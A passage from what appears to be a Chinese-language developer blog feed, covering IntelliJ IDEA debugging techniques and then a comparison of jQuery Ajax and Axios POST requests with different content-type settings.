表达式，来达到只在我们关注的 bean 执行时才暂停。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214172653364.png" alt="image-20221214172653364" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214172626920.png" alt="image-20221214172626920" /></p><h2 id="强制返回force-return"><a class="markdownIt-Anchor" href="#强制返回force-return"></a> 强制返回（Force Return）</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214172951359.png" alt="image-20221214172951359" /><br />功能：强制结束当前程序运行流程，直接返回。</p><p>当我们调试时，发现继续往下执行就要将错误的数据写入数据库时，我们可以通过 Force Return 来强行结束当前流程。<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214173011724.png" alt="image-20221214173011724" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214173059173.png" alt="image-20221214173059173" /></p><p>而如果我们是通过 Stop 按钮来结束，此时结束的是 Debug 流程，而程序流程还是会往下执行，从而将错误数据写入数据库。</p><h2 id="stream-调试trace-current-stream-chain"><a class="markdownIt-Anchor" href="#stream-调试trace-current-stream-chain"></a> Stream 调试（Trace Current Stream Chain）</h2><p>功能：当我们暂停在 Stream 的处理代码行时，可以将 Stream 的整个处理流程以图形化界面的形式展示。<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214173612204.png" alt="image-20221214173612204" /><br />合理的使用 Stream 会让我们的代码更加简洁，但是现在存在大量滥用 Stream 的情况，Stream 本身就比较抽象，大量滥用会使得 Stream的代码难以理解和调试。</p><p>当我们发现问题出在 Stream 的处理流程中时，我们可以通过该功能来看到每个步骤处理前和处理后的数据，方便我们定位排查是哪一步出了问题。</p><h2 id="执行表达式evaluate-expression"><a class="markdownIt-Anchor" href="#执行表达式evaluate-expression"></a> 执行表达式（Evaluate Expression）</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214174624265.png" alt="image-20221214174624265" /><br />功能：用于执行一段我们实时写的代码，例如查看数据、修改数据。<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214174538052.png" alt="image-20221214174538052" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214174552746.png" alt="image-20221214174552746" /></p><p>当我们在测试时，发现某段代码逻辑很难有符合条件的数据时，可以通过该功能直接修改数据，来加快我们的测试。</p><h3 id="变量查看"><a class="markdownIt-Anchor" href="#变量查看"></a> <strong>变量查看</strong></h3><p>在调试过程中往往需要观察变量的变化来判断业务逻辑，我们可以在以下的四个地方观察。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214192846353.png" alt="image-20221214192846353" /></p><p><strong>①</strong> 最常用的变量的观察区域variables</p><p><strong>②</strong> IDEA中最人性化的地方之一，会将变量的值阴影显示在变量的后面。</p><p><strong>③</strong> watch区域，眼镜的形状，一般不会展开。如下图：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214192924566.png" alt="image-20221214192924566" /></p><p>点击’+‘号可以新增需要观察的变量，点击’-'号可以删除。</p><p><strong>④</strong> 鼠标悬停在变量上也会出现变量的值，点击展开即可查看。</p><h2 id="让断点处的代码再加一行代码"><a class="markdownIt-Anchor" href="#让断点处的代码再加一行代码"></a> 让断点处的代码再加一行代码</h2><ul><li>点击下图的加号，可以在断点处加一行代码，比如下图中的count++即为新添加的代码</li><li><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214185633384.png" alt="image-20221214185633384" /><ul><li>选中count++，右键点击Edit可以编辑该代码</li><li>选中该行代码（count++），点击加号下面的减号，可以删除该行代码</li></ul></li><li>我猜想是<ul><li><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214190206459.png" alt="image-20221214190206459" /></li></ul></li></ul><h2 id="让程序执行到下一次断点后暂停"><a class="markdownIt-Anchor" href="#让程序执行到下一次断点后暂停"></a> 让程序执行到下一次断点后暂停</h2><ul><li>点击下图的按钮，debug会继续运行程序，直到遇到下一次断点后暂停</li><li><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214184803359.png" alt="image-20221214184803359" /></li></ul><h2 id="停止debug程序"><a class="markdownIt-Anchor" href="#停止debug程序"></a> 停止debug程序</h2><ul><li><p>点击下图按钮停止debug程序</p></li><li><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214184637000.png" alt="image-20221214184637000" /></p></li><li><p>注意</p><ul><li>运行的如果是javaSE项目，点一下就停止(程序会执行完成)</li><li>运行的如果是javaWeb项目，需要点两下<ul><li>第一下停止代码的当前线程</li><li>第二下停止服务器</li></ul></li></ul></li></ul><h2 id="屏蔽所有断点"><a class="markdownIt-Anchor" href="#屏蔽所有断点"></a> 屏蔽所有断点</h2><ul><li><p>点击下图按钮，可以屏蔽所有断点</p></li><li><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214184506838.png" alt="image-20221214184506838" /></p><p>屏蔽的断点在debug的时候不会运行</p><ul><li>如果程序调试后觉得没问题了，可以屏蔽掉所有断点继续运行程序查看效果</li></ul></li></ul><h2 id="把光标移到当前程序运行位置"><a class="markdownIt-Anchor" href="#把光标移到当前程序运行位置"></a> 把光标移到当前程序运行位置</h2><ul><li>点击下图按钮后，会把鼠标光标移动到当前程序运行位置<ul><li>当程序代码量很大的时候，可以通过该按钮快速定位到程序运行位置</li><li><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214184408221.png" alt="image-20221214184408221" /></li></ul></li></ul><h2 id="直接执行到光标所在位置"><a class="markdownIt-Anchor" href="#直接执行到光标所在位置"></a> 直接执行到光标所在位置</h2><p>点击下图的按钮，程序会执行到光标所在的位置</p><ul><li>前提是光标前面没有断点，否则程序还是会在光标前面的断点处暂停</li></ul><p>该功能非常强大，我们可以在这边执行任何逻辑。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214184115097.png" alt="image-20221214184115097" /></p><h2 id="在控制台改变正在debug的数据"><a class="markdownIt-Anchor" href="#在控制台改变正在debug的数据"></a> 在控制台改变正在debug的数据</h2><ul><li>在控制台选中某个变量，右键点击Set Value可以改变该变量的值<ul><li>如果想测试某个地方的数据如果是正确的会是什么效果，可以手动更改该处变量的值<img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214184206110.png" alt="image-20221214184206110" /></li></ul></li></ul><h3 id=""><a class="markdownIt-Anchor" href="#"></a> </h3><h2 id="多线程调试suspend"><a class="markdownIt-Anchor" href="#多线程调试suspend"></a> 多线程调试（Suspend）</h2><p>Suspend 有两种模式：All 和 Thread。</p><p><strong>Thread</strong>：暂停进入断点的线程，不影响其他线程执行。所有进入断电的线程依次Debug。</p><p><strong>All</strong>：暂停全部线程。只能 Debug 第一个暂停线程。</p><p>测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test2</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(()-&gt;&#123;<br>            System.out.println(<span class="hljs-string">&quot;start1&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;end1&quot;</span>);<br>        &#125;).start();<br><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(()-&gt;&#123;<br>            System.out.println(<span class="hljs-string">&quot;start2&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;end2&quot;</span>);<br>        &#125;).start();<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="thread模式执行"><a class="markdownIt-Anchor" href="#thread模式执行"></a> Thread模式执行</h3><p>通过输出内容，可以看到线程1被阻塞，线程2和主线程都已经执行结束</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214191658181.png" alt="image-20221214191658181" /></p><h3 id="all-模式执行"><a class="markdownIt-Anchor" href="#all-模式执行"></a> All 模式执行</h3><p>可以看到线程2和主线程没有使用断点，但是也被暂停了，因为没有输出内容。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214191655321.png" alt="image-20221214191655321" /></p><h3 id="还有远程debug没有条件-等以后来学习"><a class="markdownIt-Anchor" href="#还有远程debug没有条件-等以后来学习"></a> 还有远程deBug，没有条件。等以后来学习！</h3><h3 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章"></a> 参考文章</h3><ol><li><p><a href="https://blog.csdn.net/future_god_qr/article/details/121250865?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167099915116800192291037%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=167099915116800192291037&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-121250865-null-null.142%5Ev68%5Econtrol,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v2&amp;utm_term=ideadebug%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7&amp;spm=1018.2226.3001.4187">IDEA的debug调试技巧详解</a></p></li><li><p><a href="https://blog.csdn.net/qq_43102730/article/details/125252811?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167099915116800192291037%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=167099915116800192291037&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-125252811-null-null.142%5Ev68%5Econtrol,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v2&amp;utm_term=ideadebug%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7&amp;spm=1018.2226.3001.4187">实用的 IDEA Debug 调试技巧（超详细案例）</a></p></li><li><p><a href="https://blog.csdn.net/qq_34162294/article/details/105260153?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=idea%20Throw%20Exception&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-4-105260153.142%5Ev68%5Econtrol,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v2&amp;spm=1018.2226.3001.4187">大牛都会用的IDEA调试技巧！！！</a></p></li></ol>]]></content>
    
    
    <categories>
      
      <category>idea</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idea</tag>
      
      <tag>debug</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Axios和Ajax发送POST使用</title>
    <link href="/2022/12/13/Axios%E5%92%8CAjax%E5%8F%91%E9%80%81POST%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/12/13/Axios%E5%92%8CAjax%E5%8F%91%E9%80%81POST%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="ajax"><a class="markdownIt-Anchor" href="#ajax"></a> Ajax</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Ajax_test</span>(<span class="hljs-params"></span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Ajax_test&quot;</span>);<br>            $.<span class="hljs-title function_">ajax</span>(&#123;<br>                <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;post&quot;</span>,<br>                <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;http://localhost:8080/get1&quot;</span>,<br>                <span class="hljs-attr">data</span>: &#123;<br>                    <span class="hljs-string">&#x27;content&#x27;</span>: <span class="hljs-string">&quot;Ajax_test2&quot;</span><br>                &#125;,<br>                <span class="hljs-comment">// contentType: &quot;application/json&quot;,</span><br>                <span class="hljs-comment">// dataType:&quot;json&quot;, //表示可以跨域访问json数据</span><br>                <span class="hljs-attr">async</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">//锁定浏览器，只有请求处理完毕之后（回调函数调用完成之后），才能执行后面的代码</span><br>                <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) &#123;<br>                    <span class="hljs-comment">//处理返回数据</span><br>                &#125;,<br>                <span class="hljs-attr">error</span>: &#123;&#125;<br>            &#125;)<br>        &#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213215749518.png" alt="image-20221213215749518" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213215929173.png" alt="" /></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Ajax_test</span>(<span class="hljs-params"></span>) &#123;<br>           <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Ajax_test&quot;</span>);<br>           $.<span class="hljs-title function_">ajax</span>(&#123;<br>               <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;post&quot;</span>,<br>               <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;http://localhost:8080/get1&quot;</span>,<br>               <span class="hljs-attr">data</span>: &#123;<br>                   <span class="hljs-string">&#x27;content&#x27;</span>: <span class="hljs-string">&quot;Ajax_test2&quot;</span><br>               &#125;,<br>               <span class="hljs-attr">contentType</span>: <span class="hljs-string">&quot;application/json&quot;</span>,<br>               <span class="hljs-comment">// dataType:&quot;json&quot;, //表示可以跨域访问json数据</span><br>               <span class="hljs-attr">async</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">//锁定浏览器，只有请求处理完毕之后（回调函数调用完成之后），才能执行后面的代码</span><br>               <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) &#123;<br>                   <span class="hljs-comment">//处理返回数据</span><br>               &#125;,<br>               <span class="hljs-attr">error</span>: &#123;&#125;<br>           &#125;)<br>       &#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213215929173.png" alt="image-20221213215929173" /></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Ajax_test</span>(<span class="hljs-params"></span>) &#123;<br>           <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Ajax_test&quot;</span>);<br>           $.<span class="hljs-title function_">ajax</span>(&#123;<br>               <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;post&quot;</span>,<br>               <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;/&quot;</span>,<br>               <span class="hljs-attr">data</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<br>                   <span class="hljs-string">&#x27;content&#x27;</span>: <span class="hljs-string">&quot;Ajax_test2&quot;</span><br>               &#125;),<br>               <span class="hljs-comment">// contentType: &quot;application/json&quot;,</span><br>               <span class="hljs-comment">// dataType:&quot;json&quot;, //表示可以跨域访问json数据</span><br>               <span class="hljs-attr">headers</span>: &#123;<br>               &#125;,<br>               <span class="hljs-attr">async</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">//锁定浏览器，只有请求处理完毕之后（回调函数调用完成之后），才能执行后面的代码</span><br>               <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) &#123;<br>                   <span class="hljs-comment">//处理返回数据</span><br>               &#125;,<br>               <span class="hljs-attr">error</span>: &#123;&#125;<br>           &#125;)<br>       &#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213220541531.png" alt="image-20221213220541531" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213220553995.png" alt="image-20221213220553995" /></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Ajax_test</span>(<span class="hljs-params"></span>) &#123;<br>           <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Ajax_test&quot;</span>);<br>           $.<span class="hljs-title function_">ajax</span>(&#123;<br>               <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;post&quot;</span>,<br>               <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;/&quot;</span>,<br>               <span class="hljs-attr">data</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<br>                   <span class="hljs-string">&#x27;content&#x27;</span>: <span class="hljs-string">&quot;Ajax_test2&quot;</span><br>               &#125;),<br>               <span class="hljs-attr">contentType</span>: <span class="hljs-string">&quot;application/json&quot;</span>,<br>               <span class="hljs-comment">// dataType:&quot;json&quot;, //表示可以跨域访问json数据</span><br>               <span class="hljs-attr">headers</span>: &#123;<br>               &#125;,<br>               <span class="hljs-attr">async</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">//锁定浏览器，只有请求处理完毕之后（回调函数调用完成之后），才能执行后面的代码</span><br>               <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) &#123;<br>                   <span class="hljs-comment">//处理返回数据</span><br>               &#125;,<br>               <span class="hljs-attr">error</span>: &#123;&#125;<br>           &#125;)<br>       &#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213220754987.png" alt="image-20221213220754987" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213220807735.png" alt="image-20221213220807735" /></p><h2 id="axios"><a class="markdownIt-Anchor" href="#axios"></a> Axios</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Axios_test</span>(<span class="hljs-params"></span>) &#123;<br>           <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Axios_test1&quot;</span>);<br>           <span class="hljs-title function_">axios</span>(&#123;<br>               <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;post&quot;</span>,<br>               <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;http://192.168.3.24:8080/get1&quot;</span>,<br>               <span class="hljs-comment">/* headers: &#123;</span><br><span class="hljs-comment">                   &quot;Content-Type&quot;: &quot;application/json;charset=UTF-8&quot;</span><br><span class="hljs-comment">               &#125;, */</span><br>               <span class="hljs-attr">data</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<br>                   <span class="hljs-string">&#x27;content&#x27;</span>: <span class="hljs-string">&quot;Axios_test1&quot;</span><br>               &#125;)<br>           &#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br>               <span class="hljs-comment">//处理返回数据</span><br>           &#125;)<br>       &#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213221558251.png" alt="image-20221213221558251" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213221607686.png" alt="image-20221213221607686" /></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Axios_test</span>(<span class="hljs-params"></span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Axios_test1&quot;</span>);<br>            <span class="hljs-title function_">axios</span>(&#123;<br>                <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;post&quot;</span>,<br>                <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;http://192.168.3.24:8080/get1&quot;</span>,<br>                <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json;charset=UTF-8&quot;</span>,<br>                <span class="hljs-attr">data</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<br>                    <span class="hljs-string">&#x27;content&#x27;</span>: <span class="hljs-string">&quot;Axios_test1&quot;</span><br>                &#125;),<br>                <br>            &#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br>                <span class="hljs-comment">//处理返回数据</span><br>            &#125;)<br>        &#125;<br></code></pre></td></tr></table></figure><blockquote><p><strong>Axios:</strong></p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213222323951.png" alt="image-20221213222323951" /></p><blockquote><p><strong>Ajax:</strong></p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213222545937.png" alt="image-20221213222545937" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213221558251.png" alt="image-20221213221558251" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213221607686.png" alt="image-20221213221607686" /></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Axios_test</span>(<span class="hljs-params"></span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Axios_test1&quot;</span>);<br>            <span class="hljs-title function_">axios</span>(&#123;<br>                <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;post&quot;</span>,<br>                <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;http://192.168.3.24:8080/get1&quot;</span>,<br>                <span class="hljs-attr">headers</span>: &#123;<br>                    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json;charset=UTF-8&quot;</span><br>                &#125;,<br>                <span class="hljs-attr">data</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<br>                    <span class="hljs-string">&#x27;content&#x27;</span>: <span class="hljs-string">&quot;Axios_test1&quot;</span><br>                &#125;)<br>            &#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br>                <span class="hljs-comment">//处理返回数据</span><br>            &#125;)<br>        &#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213222249241.png" alt="image-20221213222249241" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213221406905.png" alt="image-20221213221406905" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213221415247.png" alt="image-20221213221415247" /></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Axios_test</span>(<span class="hljs-params"></span>) &#123;<br>           <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Axios_test1&quot;</span>);<br>           <span class="hljs-title function_">axios</span>(&#123;<br>               <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;post&quot;</span>,<br>               <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;http://192.168.3.24:8080/get1&quot;</span>,<br>               <span class="hljs-attr">headers</span>: &#123;<br>                   <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json;charset=UTF-8&quot;</span><br>               &#125;,<br>               <span class="hljs-attr">data</span>:&#123;<br>                    <span class="hljs-string">&#x27;content&#x27;</span>: <span class="hljs-string">&quot;Ajax_test3&quot;</span><br>                &#125;,<br>           &#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br>               <span class="hljs-comment">//处理返回数据</span><br>           &#125;)<br>       &#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213221654371.png" alt="image-20221213221654371" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213221702039.png" alt="image-20221213221702039" /></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Axios_test</span>(<span class="hljs-params"></span>) &#123;<br>          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Axios_test1&quot;</span>);<br>          <span class="hljs-title function_">axios</span>(&#123;<br>              <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;post&quot;</span>,<br>              <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;http://192.168.3.24:8080/get1&quot;</span>,<br>             <span class="hljs-comment">/*  headers: &#123;</span><br><span class="hljs-comment">                  &quot;Content-Type&quot;: &quot;application/json;charset=UTF-8&quot;</span><br><span class="hljs-comment">              &#125;, */</span><br>              <span class="hljs-attr">data</span>:&#123;<br>                   <span class="hljs-string">&#x27;content&#x27;</span>: <span class="hljs-string">&quot;Ajax_test3&quot;</span><br>               &#125;,<br>          &#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br>              <span class="hljs-comment">//处理返回数据</span><br>          &#125;)<br>      &#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213221730556.png" alt="image-20221213221730556" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221213221737768.png" alt="image-20221213221737768" /></p><p><mark>contentType</mark>如何设置</p><p>Ajax</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 